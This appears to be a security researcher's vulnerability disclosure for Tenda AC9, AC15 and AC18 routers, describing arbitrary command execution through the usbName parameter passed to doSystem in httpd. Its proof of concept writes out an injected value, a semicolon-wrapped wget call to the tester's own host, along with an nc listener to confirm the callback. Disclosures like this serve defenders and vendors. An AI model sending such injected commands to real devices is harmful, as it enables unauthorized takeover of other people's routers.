
vendor:Tenda

product:AC9 AC15 AC18 

version:V15.03.05.19(6318)_CN(AC9), V15.03.05.19_CN(AC15), V15.03.05.19(6318)_CN(AC18) and earlier

type:Arbitrary Command Execution

author:Ming Yuan

institution:NISL@Tsinghua University


Vulnerability description
-------------------------
I found an Arbitrary Command Execution vulnerability in the router's web server--httpd. While processing the `usbName` parameters for a post request, the value is directly passed to doSystem, which causes a rce. The details are shown below:
![image](https://github.com/ZIllR0/Routers/blob/master/Tenda/images/ace1.jpg)

PoC
-------------------------

We set the value of usbName as ';wget http://192.168.0.107:8888;' and the router will excute 'wget http://192.168.0.107:8888' command. 192.168.0.107 is our native computer's ip, then we use nc to listen port 8888, finally we capture http request from 192.168.0.1, as shown in the figure below.

![image](https://github.com/ZIllR0/Routers/blob/master/Tenda/images/ace2.jpeg)




p.s.Given the vendor's security, we only provide parts of the URL.
